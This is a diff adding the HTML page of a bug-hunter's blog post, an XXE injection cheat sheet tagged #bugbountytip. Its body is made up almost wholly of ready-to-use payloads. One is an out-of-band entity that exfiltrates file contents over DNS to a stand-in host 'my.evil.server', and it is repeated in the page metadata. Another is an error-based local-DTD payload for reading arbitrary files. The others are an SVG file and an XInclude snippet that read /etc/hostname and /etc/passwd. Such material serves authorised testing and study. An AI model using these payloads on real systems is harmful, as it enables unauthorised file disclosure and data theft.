@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head><meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<link href="https://fonts.googleapis.com/css?family=Merriweather:300|Raleway:400,700" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/style.css">
+<title>XXE_Cheat_sheet</title>
+<!-- Begin Jekyll SEO tag v2.6.1 -->
+<title>XXE_Cheat_sheet | Dexter_H</title>
+<meta name="generator" content="Jekyll v4.1.1" />
+<meta property="og:title" content="XXE_Cheat_sheet" />
+<meta name="author" content="Dexter_H" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="XXE-OOB-Over-DNS &lt;!ENTITY % data SYSTEM &quot;file:///tmp/foo&quot;&gt; &lt;!ENTITY % url &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://%data;.my.evil.server&#39;&gt;&quot;&gt;" />
+<meta property="og:description" content="XXE-OOB-Over-DNS &lt;!ENTITY % data SYSTEM &quot;file:///tmp/foo&quot;&gt; &lt;!ENTITY % url &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://%data;.my.evil.server&#39;&gt;&quot;&gt;" />
+<link rel="canonical" href="http://localhost:4000/security/2020/08/13/XXE_Cheat_Sheet.html" />
+<meta property="og:url" content="http://localhost:4000/security/2020/08/13/XXE_Cheat_Sheet.html" />
+<meta property="og:site_name" content="Dexter_H" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-08-13T04:00:00+09:00" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/security/2020/08/13/XXE_Cheat_Sheet.html","headline":"XXE_Cheat_sheet","dateModified":"2020-08-13T04:00:00+09:00","datePublished":"2020-08-13T04:00:00+09:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/security/2020/08/13/XXE_Cheat_Sheet.html"},"author":{"@type":"Person","name":"Dexter_H"},"description":"XXE-OOB-Over-DNS &lt;!ENTITY % data SYSTEM &quot;file:///tmp/foo&quot;&gt; &lt;!ENTITY % url &quot;&lt;!ENTITY &amp;#x25; exfil SYSTEM &#39;http://%data;.my.evil.server&#39;&gt;&quot;&gt;","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+</head>
+
+<body>
+  <main class="container">
+    <section class="about">
+      <a href="/"><img src="/assets/portfolio.png" alt="Dexter_H"></a>
+      <h2 id="title">
+        <a href="/">Dexter_H</a>
+      </h2>
+      <p class="tagline">BugHunter, Gambler</p>
+      <ul class="social"><a href="https://github.com/dexter-sec" target="_blank">
+          <li>
+            <i class="icon-github-circled"></i>
+          </li>
+        </a></ul><a href="/portal.html"> portal </a>
+      <p>&copy;
+        2020</p><div>
+        <p>Dark Mode
+          <i class="icon-moon"></i>
+          <label class="switch">
+            <input type="checkbox" id="dark-mode-toggle">
+            <span class="slider round" onclick="toggleDarkMode()"></span>
+          </label>
+        </p>
+      </div>
+      <script type="text/javascript" src="/assets/js/darkmode.js"></script></section>
+    <section class="content">
+      <div class="post-container">
+  <a class="post-link" href="/security/2020/08/13/XXE_Cheat_Sheet.html">
+    <h2 class="post-title">XXE_Cheat_sheet</h2>
+  </a>
+  <div class="post-meta">
+    <div class="post-date"><i class="icon-calendar"></i>Aug 13, 2020</div><ul class="post-categories"><li>Security</li></ul></div>
+  <div style="text-align: left;">
+	<a href="http://hits.dwyl.com/localhost:4000/security-2020-08-13-XXE_Cheat_Sheet.html" target="_blank">
+	  <img src="http://hits.dwyl.com/localhost:4000/security-2020-08-13-XXE_Cheat_Sheet.html.svg" />
+	</a>
+  </div> 
+  <div class="post">
+
+  
+    
+      <span class="tag">#bugbountytip</span>
+    
+  
+
+
+	<p><br /></p>
+<h3 id="xxe-oob-over-dns">XXE-OOB-Over-DNS</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!ENTITY % data SYSTEM "file:///tmp/foo"&gt;
+&lt;!ENTITY % url "&lt;!ENTITY &amp;#x25; exfil SYSTEM 'http://%data;.my.evil.server'&gt;"&gt;
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<h3 id="xxe-witch-local_dtddocbookxdtd">XXE-Witch-Local_DTD(docbookx.dtd)</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!DOCTYPE root [
+    &lt;!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"&gt;
+
+    &lt;!ENTITY % ISOamsa '
+ &lt;!ENTITY &amp;#x25; file SYSTEM "file:///REPLACE_WITH_FILENAME_TO_READ"&gt;
+ &lt;!ENTITY &amp;#x25; eval "&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///abcxyz/&amp;#x25;file;&amp;#x27;&gt;"&gt;
+ &amp;#x25;eval;
+ &amp;#x25;error;
+ '&gt;
+
+    %local_dtd;
+]&gt;
+&lt;root&gt;&lt;/root&gt;
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<h3 id="xxe-inside-svg">XXE-inside-SVG</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0" standalone="yes"?&gt;
+&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;
+&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"&gt;
+   &lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;
+&lt;/svg&gt;
+</code></pre></div></div>
+<p><br />
+<br /></p>
+
+<h3 id="xxe-xinclude">XXE-Xinclude</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;
+</code></pre></div></div>
+<p><br />
+<br />
+<br /></p>
+
+<p>ref) 
+Usually does tricks work for me. but, try other way ins’t hurt us, right? :)</p>
+
+<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection#xxe-oob-with-apache-karaf">allthegoodthing</a>
+:)</p>
+
+
+  </div></div>
+
+    </section>
+  </main>
+  <script src="/assets/js/simple-jekyll-search.min.js"></script>
+  <script src="/assets/js/search.js"></script>
+  
+</body>
+
+</html>
